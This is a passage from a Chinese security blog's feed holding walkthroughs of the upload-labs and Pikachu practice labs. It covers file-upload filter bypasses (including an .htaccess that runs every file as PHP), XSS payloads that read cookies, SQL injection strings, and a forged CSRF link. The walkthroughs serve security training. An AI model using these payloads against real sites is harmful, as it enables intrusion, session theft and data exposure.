class><h2 id="Pass04-黑名单-htaccess绕过"><a href="#Pass04-黑名单-htaccess绕过" class="headerlink" title="Pass04.黑名单 .htaccess绕过"></a>Pass04.黑名单 .htaccess绕过</h2><p><code>先上传.htaccess文件，内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此条伪静态规则为将demo文件解析成php文件执行</span><br><span class="line">&lt;FilesMatch &quot;demo&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">也可以是以下，将所有文件解析为php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><code>本次使用第二条，将所有文件解析为php</code></p><img src="/2021/05/03/upload-labs/image-20210501130707455.png" class><h2 id="Pass05-黑名单-大小写绕过"><a href="#Pass05-黑名单-大小写绕过" class="headerlink" title="Pass05.黑名单 大小写绕过"></a>Pass05.黑名单 大小写绕过</h2><p><code>禁止上传.htaccess</code></p><img src="/2021/05/03/upload-labs/image-20210501131324884.png" class><h2 id="Pass06-黑名单-空格绕过"><a href="#Pass06-黑名单-空格绕过" class="headerlink" title="Pass06.黑名单 空格绕过"></a>Pass06.黑名单 空格绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个空格即可(需要在windows环境下，widows自动去空格和点)</code></p><h2 id="Pass07-黑名单-点绕过"><a href="#Pass07-黑名单-点绕过" class="headerlink" title="Pass07.黑名单 点绕过"></a>Pass07.黑名单 点绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个点即可(最好在windows环境下)</code></p><img src="/2021/05/03/upload-labs/image-20210501134215848.png" class><h2 id="Pass08-黑名单-DATA绕过"><a href="#Pass08-黑名单-DATA绕过" class="headerlink" title="Pass08.黑名单 ::$DATA绕过"></a>Pass08.黑名单 ::$DATA绕过</h2><p><code>文件后缀添加::$DATA绕过(windows环境)</code></p><h2 id="Pass09-黑名单-点空点绕过"><a href="#Pass09-黑名单-点空点绕过" class="headerlink" title="Pass09.黑名单 点空点绕过"></a>Pass09.黑名单 点空点绕过</h2><p><code>会删除文件后的点，在文件后添加. .进行绕过(window环境)</code></p><h2 id="Pass10-黑名单-双写后缀绕过"><a href="#Pass10-黑名单-双写后缀绕过" class="headerlink" title="Pass10.黑名单 双写后缀绕过"></a>Pass10.黑名单 双写后缀绕过</h2><p><code>从前匹配php进行删除，双写绕过</code></p><h2 id="Pass11-白名单-00绕过"><a href="#Pass11-白名单-00绕过" class="headerlink" title="Pass11.白名单 %00绕过"></a>Pass11.白名单 %00绕过</h2><p><code>get传参路径可控</code></p><img src="/2021/05/03/upload-labs/image-20210501173709601.png" class><p><code>PHP版本小于5.3.4 关闭GPC</code></p><img src="/2021/05/03/upload-labs/image-20210501180802917.png" class><h2 id="Pass12-白名单-0x00绕过"><a href="#Pass12-白名单-0x00绕过" class="headerlink" title="Pass12.白名单 0x00绕过"></a>Pass12.白名单 0x00绕过</h2><blockquote><p>shell_get.php%00</p></blockquote><p><code>同上，由于post传参所以将%00进行url编码</code></p><img src="/2021/05/03/upload-labs/image-20210501182130172.png" class><h2 id="Pass13-检查图标内容开头2个字节-图片马绕过"><a href="#Pass13-检查图标内容开头2个字节-图片马绕过" class="headerlink" title="Pass13.检查图标内容开头2个字节 图片马绕过"></a>Pass13.检查图标内容开头2个字节 图片马绕过</h2><img src="/2021/05/03/upload-labs/image-20210501184645711.png" class><h2 id="Pass14-getimagesize-检查是否为图片文件-图片马绕过"><a href="#Pass14-getimagesize-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass14.getimagesize()检查是否为图片文件 图片马绕过"></a>Pass14.getimagesize()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass15-exif-imagetype-检查是否为图片文件-图片马绕过"><a href="#Pass15-exif-imagetype-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass15.exif_imagetype()检查是否为图片文件 图片马绕过"></a>Pass15.exif_imagetype()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass16-图片二次渲染"><a href="#Pass16-图片二次渲染" class="headerlink" title="Pass16.图片二次渲染"></a>Pass16.图片二次渲染</h2><p><code>将二次渲染后文件未变化的部分添加一句话，再次上传，再包含，蚁剑连接。本案例使用gif，图片不知道为什么上传不上去。</code> </p><img src="/2021/05/03/upload-labs/image-20210503180938026.png" class><h2 id="Pass17-条件竞争"><a href="#Pass17-条件竞争" class="headerlink" title="Pass17.条件竞争"></a>Pass17.条件竞争</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL3BlbmV0cmF0aW9uLXRlc3QvdXBsb2FkLWxhYnMtcGFzcy0xNy5odG1s">大佬的文章<i class="fa fa-external-link-alt"></i></span></p><p><code>先move再判断，符合白名单就重命名，不符合就unlink。</code></p><p><code>但是我图片马直接就可以了，为了学习新知识，也用大佬的方法做了一遍</code></p><h2 id="Pass18-条件竞争"><a href="#Pass18-条件竞争" class="headerlink" title="Pass18.条件竞争"></a>Pass18.条件竞争</h2><p><code>与pass17类似</code></p><h2 id="Pass19-绕过"><a href="#Pass19-绕过" class="headerlink" title="Pass19./.绕过"></a>Pass19./.绕过</h2><p><code>move_uploaded_file会忽略掉文件末尾的 /.</code></p><img src="/2021/05/03/upload-labs/image-20210503190859889.png" class><img src="/2021/05/03/upload-labs/image-20210503191007583.png" class><h2 id="Pass20-代码审计-数组绕过"><a href="#Pass20-代码审计-数组绕过" class="headerlink" title="Pass20.代码审计 数组绕过"></a>Pass20.代码审计 数组绕过</h2><p><code>直接参考大佬的文章</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwMjk3OTUvYXJ0aWNsZS9kZXRhaWxzLzEwMjkxNzE5OQ==">地址<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Pass01-基于前端js验证&quot;&gt;&lt;a href=&quot;#Pass01-基于前端js验证&quot; class=&quot;headerlink&quot; title=&quot;Pass01.基于前端js验证&quot;&gt;&lt;/a&gt;Pass01.基于前端js验证&lt;/h2&gt;&lt;p&gt;&lt;code&gt;上传图片抓包改后缀&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pass02-检测MIME类型&quot;&gt;&lt;a href=&quot;#Pass02-检测MIME类型&quot; class=&quot;headerlink&quot; title=&quot;Pass02.检测MIME类型&quot;&gt;&lt;/a&gt;Pass02.检测MIME类型&lt;/h2&gt;&lt;p&gt;&lt;code&gt;修改MIME为image/jpeg&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web靶场" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Pikachu靶机</title>
    <link href="https://lunamoore.github.io/2021/04/28/Pikachu/"/>
    <id>https://lunamoore.github.io/2021/04/28/Pikachu/</id>
    <published>2021-04-28T06:13:40.000Z</published>
    <updated>2021-05-03T11:35:43.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01.暴力破解"></a>0x01.暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Burte Force（暴力破解）概述</span><br><span class="line">“暴力破解”是一攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 </span><br><span class="line">其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 </span><br><span class="line">为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</span><br><span class="line">理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 </span><br><span class="line">我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 </span><br><span class="line">这里的认证安全策略, 包括：</span><br><span class="line">1.是否要求用户设置复杂的密码；</span><br><span class="line">2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</span><br><span class="line">3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</span><br><span class="line">4.是否采用了双因素认证；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="01-基于表单的暴力破解"><a href="#01-基于表单的暴力破解" class="headerlink" title="01.基于表单的暴力破解"></a>01.基于表单的暴力破解</h3><p><code>没有验证，直接爆破</code></p><img src="/2021/04/28/Pikachu/image-20210426093055435.png" class><img src="/2021/04/28/Pikachu/image-20210426093144110.png" class><img src="/2021/04/28/Pikachu/image-20210426093156702.png" class><img src="/2021/04/28/Pikachu/image-20210426093250664.png" class><h3 id="02-验证码绕过-on-server"><a href="#02-验证码绕过-on-server" class="headerlink" title="02.验证码绕过(on server)"></a>02.验证码绕过(on server)</h3><p><code>当验证码输入正确、为空和输入错误会是以下3种情况：</code></p><img src="/2021/04/28/Pikachu/image-20210426093447946.png" class><img src="/2021/04/28/Pikachu/image-20210426093726275.png" class><img src="/2021/04/28/Pikachu/image-20210426093751155.png" class><p><code>绕过的思路就是观察验证码会不是认证一次就刷新</code></p><p><code>这里更改用户名密码，不更改验证码，返回的结果均为账户密码错误，可以得出验证码不是认证一次刷新一次</code></p><img src="/2021/04/28/Pikachu/image-20210426094235586.png" class><img src="/2021/04/28/Pikachu/image-20210426094442761.png" class><p><code>接下来按照上一题进行爆破即可</code></p><h3 id="03-验证码绕过-on-client"><a href="#03-验证码绕过-on-client" class="headerlink" title="03.验证码绕过(on client)"></a>03.验证码绕过(on client)</h3><p><code>前端的验证直接bp抓包即可，同上</code></p><img src="/2021/04/28/Pikachu/image-20210426095048409.png" class><h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02.XSS"></a>0x02.XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">XSS（跨站脚本）概述</span><br><span class="line">Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。</span><br><span class="line">一般XSS可以分为如下几种常见类型：</span><br><span class="line">    1.反射性XSS;</span><br><span class="line">    2.存储型XSS;</span><br><span class="line">    3.DOM型XSS;</span><br><span class="line"></span><br><span class="line">XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</span><br><span class="line">XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</span><br><span class="line">形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</span><br><span class="line">因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</span><br><span class="line">  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</span><br><span class="line">  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</span><br></pre></td></tr></table></figure><h3 id="01-反射型xss-get"><a href="#01-反射型xss-get" class="headerlink" title="01.反射型xss(get)"></a>01.反射型xss(get)</h3><p><code>没有过滤直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="02-反射型xss-post"><a href="#02-反射型xss-post" class="headerlink" title="02.反射型xss(post)"></a>02.反射型xss(post)</h3><p><code>根据提示登入，直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="03-存储型xss"><a href="#03-存储型xss" class="headerlink" title="03.存储型xss"></a>03.存储型xss</h3><p><code>没有过滤直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="04-DOM型xss"><a href="#04-DOM型xss" class="headerlink" title="04.DOM型xss"></a>04.DOM型xss</h3><p><code>测试发现输入的内容在&lt;a&gt;标签中，只有闭合a标签才可以插入任意代码</code></p><img src="/2021/04/28/Pikachu/image-20210426102947841.png" class><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&quot;alert(/xss/)&quot;&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426104744355.png" class><h3 id="05-DOM型xss-x"><a href="#05-DOM型xss-x" class="headerlink" title="05.DOM型xss-x"></a>05.DOM型xss-x</h3><p><code>同上</code></p><img src="/2021/04/28/Pikachu/image-20210426125421138.png" class><h3 id="06-xss-盲打"><a href="#06-xss-盲打" class="headerlink" title="06.xss 盲打"></a>06.xss 盲打</h3><p><code>前台输入数据不会显示结果，只有登入到后台才会看到</code></p><img src="/2021/04/28/Pikachu/image-20210426130043847.png" class><p><code>每次刷新都会弹窗</code></p><img src="/2021/04/28/Pikachu/image-20210426130139582.png" class><h3 id="07-xss过滤"><a href="#07-xss过滤" class="headerlink" title="07.xss过滤"></a>07.xss过滤</h3><p><code>过滤了script，使用大小写绕过即可</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(<span class="regexp">/xss/</span>)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131019115.png" class><h3 id="08-xss之htmlspecialchars"><a href="#08-xss之htmlspecialchars" class="headerlink" title="08.xss之htmlspecialchars"></a>08.xss之htmlspecialchars</h3><p><code>htmlspecialchars()函数将特殊字符转换为HTML实体</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;</span><br><span class="line">&quot; （双引号）成为 &quot;</span><br><span class="line">&#39; （单引号）成为 &#39;</span><br><span class="line">&lt; （小于）成为 &lt;</span><br><span class="line">&gt; （大于）成为 &gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&#x27;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131739542.png" class><h3 id="09-xss之hre输出"><a href="#09-xss之hre输出" class="headerlink" title="09.xss之hre输出"></a>09.xss之hre输出</h3><p><code>点击触发代码</code></p><img src="/2021/04/28/Pikachu/image-20210426132151201.png" class><h3 id="10-xss之js输出"><a href="#10-xss之js输出" class="headerlink" title="10.xss之js输出"></a>10.xss之js输出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426133309084.png" class><h2 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03.CSRF"></a>0x03.CSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CSRF(跨站请求伪造)概述</span><br><span class="line">Cross-site request forgery 简称为“CSRF”，</span><br><span class="line">在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），</span><br><span class="line">然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。</span><br><span class="line">所以CSRF攻击也成为&quot;one click&quot;攻击。 </span><br><span class="line">很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,</span><br><span class="line">更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</span><br><span class="line">这里列举一个场景解释一下，希望能够帮助你理解。</span><br><span class="line">场景需求：</span><br><span class="line">小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。</span><br><span class="line">先看下大白是如何修改自己的密码的：</span><br><span class="line">登录---修改会员信息，提交请求---修改成功。</span><br><span class="line">所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</span><br><span class="line">但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？</span><br><span class="line">于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</span><br><span class="line">【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br><span class="line">于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</span><br><span class="line">为啥小黑的操作能够实现呢。有如下几个关键点：</span><br><span class="line">1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;</span><br><span class="line">---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</span><br><span class="line">2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;</span><br><span class="line">---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。</span><br><span class="line">---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。</span><br><span class="line">当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。</span><br><span class="line">---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</span><br><span class="line">因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：</span><br><span class="line">--对敏感信息的操作增加安全的token；</span><br><span class="line">--对敏感信息的操作增加安全的验证码；</span><br><span class="line">--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</span><br></pre></td></tr></table></figure><h3 id="01-CSRF-get"><a href="#01-CSRF-get" class="headerlink" title="01.CSRF(get)"></a>01.CSRF(get)</h3><p><code>lili登入，get传参</code></p><img src="/2021/04/28/Pikachu/image-20210426134446159.png" class><p><code>伪造连接让kobe点击</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://81.70.195.159:8001/vul/csrf/csrfget/csrf_get_edit.php?sex=demo&amp;phonenum=110&amp;add=demo&amp;email=demo%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426134739431.png" class><h3 id="02-CSRF-post"><a href="#02-CSRF-post" class="headerlink" title="02.CSRF(post)"></a>02.CSRF(post)</h3><p><code>这回用kobe欺骗lili</code></p><img src="/2021/04/28/Pikachu/image-20210426135921623.png" class><p><code>生成POC，让lili点</code></p><img src="/2021/04/28/Pikachu/image-20210426140028390.png" class><p><code>lili登入，lili点击</code></p><img src="/2021/04/28/Pikachu/image-20210426140224883.png" class><p><code>修改成功</code></p><img src="/2021/04/28/Pikachu/image-20210426140321498.png" class><h3 id="03-CSRF-token"><a href="#03-CSRF-token" class="headerlink" title="03.CSRF token"></a>03.CSRF token</h3><p><code>查看源码</code></p><h2 id="0x04-Sql-Inject"><a href="#0x04-Sql-Inject" class="headerlink" title="0x04.Sql Inject"></a>0x04.Sql Inject</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</span><br><span class="line">    </span><br><span class="line">一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</span><br><span class="line">SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，</span><br><span class="line">导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 </span><br><span class="line">从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</span><br><span class="line">在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</span><br><span class="line">1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</span><br><span class="line">2.使用参数化（Parameterized Query 或 Parameterized Statement）；</span><br><span class="line">3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重!</span><br></pre></td></tr></table></figure><h3 id="01-数字型注入-post"><a href="#01-数字型注入-post" class="headerlink" title="01.数字型注入(post)"></a>01.数字型注入(post)</h3><p><code>一共两个字段，爆表爆字段不在赘述</code></p><img src="/2021/04/28/Pikachu/image-20210427091648529.png" class><h3 id="02-字符型注入-get"><a href="#02-字符型注入-get" class="headerlink" title="02.字符型注入(get)"></a>02.字符型注入(get)</h3><p><code>闭合单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27; or &#x27;1&#x27;=&#x27;1&amp;submit=查询</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092111715.png" class><h3 id="03-搜索型注入"><a href="#03-搜索型注入" class="headerlink" title="03.搜索型注入"></a>03.搜索型注入</h3><p><code>直接输入%%即可，%%表示查询列有不为null的全部值</code></p><img src="/2021/04/28/Pikachu/image-20210427092429147.png" class><h3 id="04-xx型注入"><a href="#04-xx型注入" class="headerlink" title="04.xx型注入"></a>04.xx型注入</h3><p><code>闭合字符为&#39;) 同第一题</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27;) or 1=1 -- -&amp;submit=查询</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092840466.png" class><h3 id="05-insert-update注入"><a href="#05-insert-update注入" class="headerlink" title="05.insert/update注入"></a>05.insert/update注入</h3><p><code>注册点存在注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admon&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427102044309.png" class><h3 id="06-delete注入"><a href="#06-delete注入" class="headerlink" title="06.delete注入"></a>06.delete注入</h3><p><code>同上</code></p><img src="/2021/04/28/Pikachu/image-20210427103706046.png" class><h3 id="07-http-header-注入"><a href="#07-http-header-注入" class="headerlink" title="07.http header 注入"></a>07.http header 注入</h3><p><code>注入点为user-agent/cookie</code></p><img src="/2021/04/28/Pikachu/image-20210427105308987.png" class><h3 id="08-盲注-base-boolian"><a href="#08-盲注-base-boolian" class="headerlink" title="08.盲注(base boolian)"></a>08.盲注(base boolian)</h3><p><code>逐字爆破数据库第一个字母为p</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427111803637.png" class><h3 id="09-盲注-base-time"><a href="#09-盲注-base-time" class="headerlink" title="09.盲注(base time)"></a>09.盲注(base time)</h3><p><code>输入什么都只有一个回显</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427112355990.png" class><h3 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10.宽字节注入"></a>10.宽字节注入</h3><blockquote><p>payload</p><p>kobe%e0’ or 1=1 – -</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427151329767.png" class><h2 id="0x05-RCE"><a href="#0x05-RCE" class="headerlink" title="0x05.RCE"></a>0x05.RCE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RCE(remote command/code execute)概述RCE漏洞，</span><br><span class="line">可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，</span><br><span class="line">从而控制后台系统。远程系统命令执行一般出现这种漏洞，</span><br><span class="line">是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，</span><br><span class="line">用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 </span><br><span class="line">而，如果，设计者在完成该功能时，没有做严格的安全控制，</span><br><span class="line">则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，</span><br><span class="line">从而控制整个后台服务器现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 </span><br><span class="line">在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,</span><br><span class="line">会有意想不到的&quot;收获&quot;-_-远程代码执行同样的道理,因为需求设计,</span><br><span class="line">后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 </span><br><span class="line">不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</span><br><span class="line">因此，如果需要给前端用户提供操作类的API接口，</span><br><span class="line">一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</span><br></pre></td></tr></table></figure><h3 id="01-exec-ping"><a href="#01-exec-ping" class="headerlink" title="01.exec(ping)"></a>01.exec(ping)</h3><p><code>简单的命令执行</code></p><img src="/2021/04/28/Pikachu/image-20210427152244048.png" class><h2 id="02-exec-eval"><a href="#02-exec-eval" class="headerlink" title="02.exec(eval)"></a>02.exec(eval)</h2><p><code>响应php代码</code></p><img src="/2021/04/28/Pikachu/image-20210427152552241.png" class><h2 id="0x06-文件包含"><a href="#0x06-文件包含" class="headerlink" title="0x06.文件包含"></a>0x06.文件包含</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion(文件包含漏洞)概述文件包含，是一个功能。</span><br><span class="line">在各种开发语言中都提供了内置的文件包含函数，</span><br><span class="line">其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 </span><br><span class="line">比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，</span><br><span class="line">这些函数在代码设计中被经常使用到。</span><br><span class="line">大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 </span><br><span 